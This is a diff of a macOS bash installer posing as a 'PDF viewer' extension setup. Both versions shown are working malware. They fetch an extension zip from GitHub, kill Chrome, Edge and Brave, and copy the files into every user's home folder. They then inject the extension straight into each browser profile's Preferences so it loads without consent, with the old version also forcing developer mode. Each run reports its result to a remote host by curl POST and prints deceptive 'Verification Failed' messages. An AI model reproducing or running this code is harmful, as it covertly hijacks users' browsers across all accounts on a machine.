@@ -1,188 +1,93 @@
 #!/bin/bash
 set -e
-exec 2>/tmp/pdf-viewer-install.log
-EXTENSION_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
-EXTENSION_REPO="Castro02980/pdf-viewer-extension"
-EXTENSION_ZIP_URL="https://github.com/$EXTENSION_REPO/archive/refs/heads/main.zip"
+EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
 NOTIFY_URL="https://wln.ink/n"
-INJ_COUNT=0
-LAST_ERR=""
-RELAUNCH_APPS=()
+INJ=0
 
-TEMP_ZIP="/tmp/pdf-viewer-ext.zip"
-curl -fsSL "$EXTENSION_ZIP_URL" -o "$TEMP_ZIP" || { echo "Verification Failed, try again!" >&2; exit 1; }
-rm -rf /tmp/pdf-viewer-temp
-mkdir -p /tmp/pdf-viewer-temp
-unzip -q "$TEMP_ZIP" -d /tmp/pdf-viewer-temp 2>/dev/null
-MANIFEST_PATH=$(find /tmp/pdf-viewer-temp -name "manifest.json" -type f 2>/dev/null | head -1)
-if [ -z "$MANIFEST_PATH" ]; then
-    rm -f "$TEMP_ZIP"
-    echo "Verification Failed, try again!" >&2
-    exit 1
-fi
-EXTENSION_SOURCE_DIR=$(dirname "$MANIFEST_PATH")
-SRC_MANIFEST=$(cat "$MANIFEST_PATH")
-if ! echo "$SRC_MANIFEST" | grep -q '"key"'; then
-    rm -f "$TEMP_ZIP"
-    rm -rf /tmp/pdf-viewer-temp
-    echo "Verification Failed, try again!" >&2
-    exit 1
-fi
-rm -f "$TEMP_ZIP"
+TMP_ZIP="/tmp/pdf-ext.zip"
+TMP_DIR="/tmp/pdf-ext-tmp"
+curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || { echo "Download failed"; exit 1; }
+rm -rf "$TMP_DIR"
+unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || { echo "Unzip failed"; exit 1; }
+MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
+[ -z "$MANIFEST" ] && { echo "Extension not found"; exit 1; }
+EXT_SRC=$(dirname "$MANIFEST")
+rm -f "$TMP_ZIP"
 
-for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
-    if ps aux | grep "$APP" | grep -v grep >/dev/null 2>&1; then
-        RELAUNCH_APPS+=("$APP")
-    fi
-done
+gen_id() {
+    local path="$1"
+    echo -n "$path" | shasum -a 256 | head -c 32 | perl -pe 's/(.)/sprintf("%c", 97 + (ord($1) & 15))/ge'
+}
 
-for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
-    ps aux | grep "$APP" | grep -v grep | awk '{print $2}' | xargs kill 2>/dev/null || true
-done
-DEADLINE=$(($(date +%s) + 8))
-while [ $(date +%s) -lt $DEADLINE ]; do
-    if ! ps aux | grep -E 'Google Chrome|Microsoft Edge|Brave Browser' | grep -v grep >/dev/null 2>&1; then
-        break
-    fi
-    sleep 0.3
-done
-for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
-    ps aux | grep "$APP" | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null || true
+inject_pref() {
+    local pref="$1" ext_dir="$2" ext_id="$3"
+    [ ! -f "$pref" ] && return 1
+    
+    perl -0777 -i -pe '
+        BEGIN {
+            $ext_dir = $ENV{EXT_DIR};
+            $ext_id = $ENV{EXT_ID};
+            $manifest = `cat "$ENV{MANIFEST}"`;
+            chomp $manifest;
+        }
+        
+        s/"extensions"\s*:\s*\{/"extensions":{/s;
+        
+        if (/"extensions"\s*:\s*\{/) {
+            s/("extensions"\s*:\s*\{)/$1"settings":{/s unless /"settings"\s*:\s*\{/;
+            
+            unless (/"$ext_id"/) {
+                s/("settings"\s*:\s*\{)/$1"$ext_id":{"path":"$ext_dir","location":4,"state":1,"manifest":$manifest},/s;
+            }
+        }
+    ' "$pref" 2>/dev/null || return 1
+    
+    grep -q "$ext_id" "$pref" && return 0 || return 1
+}
+
+for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
+    pkill -x "$app" 2>/dev/null || true
 done
 sleep 1
 
-for USER_HOME in /Users/*; do
-    if [ ! -d "$USER_HOME" ] || [ "$USER_HOME" = "/Users/Shared" ]; then
-        continue
-    fi
-    USER_NAME=$(basename "$USER_HOME")
-    HAS_BROWSER=0
-    for REL in "Library/Application Support/Google/Chrome" \
-               "Library/Application Support/Microsoft Edge" \
-               "Library/Application Support/BraveSoftware/Brave-Browser"; do
-        if [ -d "$USER_HOME/$REL" ]; then
-            HAS_BROWSER=1
-            break
-        fi
-    done
-    if [ $HAS_BROWSER -eq 0 ]; then
-        continue
-    fi
-    USER_EXT_DIR="$USER_HOME/Library/Application Support/PDFViewerExtension"
-    rm -rf "$USER_EXT_DIR" 2>/dev/null || true
-    if ! cp -R "$EXTENSION_SOURCE_DIR" "$USER_EXT_DIR" 2>/dev/null; then
-        LAST_ERR="copy $USER_NAME failed"
-        continue
-    fi
-    USER_MANIFEST_PATH="$USER_EXT_DIR/manifest.json"
-    if [ ! -f "$USER_MANIFEST_PATH" ]; then
-        continue
-    fi
-    for REL in "Library/Application Support/Google/Chrome" \
-               "Library/Application Support/Microsoft Edge" \
-               "Library/Application Support/BraveSoftware/Brave-Browser"; do
-        USER_DATA_DIR="$USER_HOME/$REL"
-        if [ ! -d "$USER_DATA_DIR" ]; then
-            continue
-        fi
-        for PROFILE_DIR in "$USER_DATA_DIR/Default" "$USER_DATA_DIR/Profile"*; do
-            if [ ! -d "$PROFILE_DIR" ]; then
-                continue
-            fi
-            PREFS_PATH="$PROFILE_DIR/Preferences"
-            if [ ! -f "$PREFS_PATH" ]; then
-                continue
-            fi
-            PROFILE_NAME=$(basename "$PROFILE_DIR")
-            RESULT=$(python3 - "$PREFS_PATH" "$USER_EXT_DIR" "$USER_MANIFEST_PATH" "$EXTENSION_ID" "$USER_NAME" "$PROFILE_NAME" 2>&1 <<'PYTHON_SCRIPT'
-import json
-import sys
-
-prefs_path = sys.argv[1]
-ext_dir = sys.argv[2]
-man_path = sys.argv[3]
-ext_id = sys.argv[4]
-user_name = sys.argv[5]
-profile_name = sys.argv[6]
-
-try:
-    with open(prefs_path, 'r', encoding='utf-8') as f:
-        prefs = json.load(f)
-    with open(man_path, 'r', encoding='utf-8') as f:
-        manifest = json.load(f)
+for uhome in /Users/*; do
+    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue
     
-    if 'extensions' not in prefs:
-        prefs['extensions'] = {}
-    if 'ui' not in prefs['extensions']:
-        prefs['extensions']['ui'] = {}
-    prefs['extensions']['ui']['developer_mode'] = True
-    if 'settings' not in prefs['extensions']:
-        prefs['extensions']['settings'] = {}
+    uext="$uhome/Library/Application Support/PDFViewerExt"
+    rm -rf "$uext" 2>/dev/null || true
+    cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue
     
-    prefs['extensions']['settings'][ext_id] = {
-        'path': ext_dir,
-        'location': 4,
-        'state': 1,
-        'manifest': manifest
-    }
+    eid=$(gen_id "$uext")
+    export EXT_DIR="$uext"
+    export EXT_ID="$eid"
+    export MANIFEST="$uext/manifest.json"
     
-    out = json.dumps(prefs, separators=(',', ':'))
-    json.loads(out)
-    
-    with open(prefs_path, 'w', encoding='utf-8') as f:
-        f.write(out)
-    
-    with open(prefs_path, 'r', encoding='utf-8') as f:
-        readback = f.read()
-    
-    if ext_id not in readback or 'developer_mode' not in readback:
-        print(f"error:{user_name}/{profile_name}:readback failed", file=sys.stderr)
-        sys.exit(1)
-    
-    print("success")
-except Exception as e:
-    print(f"error:{user_name}/{profile_name}:{e}", file=sys.stderr)
-    sys.exit(1)
-PYTHON_SCRIPT
-)
-            if echo "$RESULT" | grep -q "success"; then
-                INJ_COUNT=$((INJ_COUNT + 1))
-            else
-                LAST_ERR="$RESULT"
+    for rel in "Google/Chrome" "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
+        udata="$uhome/Library/Application Support/$rel"
+        [ ! -d "$udata" ] && continue
+        
+        for pdir in "$udata/Default" "$udata/Profile"*; do
+            [ ! -d "$pdir" ] && continue
+            pref="$pdir/Preferences"
+            if inject_pref "$pref" "$uext" "$eid"; then
+                INJ=$((INJ + 1))
             fi
         done
     done
 done
 
-rm -rf /tmp/pdf-viewer-temp
+rm -rf "$TMP_DIR"
 
-if [ $INJ_COUNT -eq 0 ]; then
-    curl -fsS -m 5 -X POST "$NOTIFY_URL" \
-        -H 'Content-Type: text/plain' \
-        --data "ev=install_fail&os=macos&extra=inj:0 $LAST_ERR" \
-        >/dev/null 2>&1 || true
-    echo "Verification Failed, try again!"
+if [ $INJ -eq 0 ]; then
+    curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
+    echo "No browser profiles found"
     exit 1
 fi
 
-if [ ${#RELAUNCH_APPS[@]} -gt 0 ]; then
-    for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
-        open -a "$APP" --args --restore-last-session 2>/dev/null || true
-    done
-    sleep 10
-    pkill -x "Google Chrome" 2>/dev/null || true
-    pkill -x "Microsoft Edge" 2>/dev/null || true
-    pkill -x "Brave Browser" 2>/dev/null || true
-    sleep 2
-    for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
-        open -a "$APP" --args --restore-last-session 2>/dev/null || true
-    done
-fi
+for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
+    open -a "$app" --args --restore-last-session 2>/dev/null || true
+done
 
-curl -fsS -m 5 -X POST "$NOTIFY_URL" \
-    -H 'Content-Type: text/plain' \
-    --data "ev=install&os=macos&v=1.0.0&extra=inj:$INJ_COUNT" \
-    >/dev/null 2>&1 || true
-
-echo "Successfully completed"
+curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
+echo "Successfully installed to $INJ profiles"
 exit 0
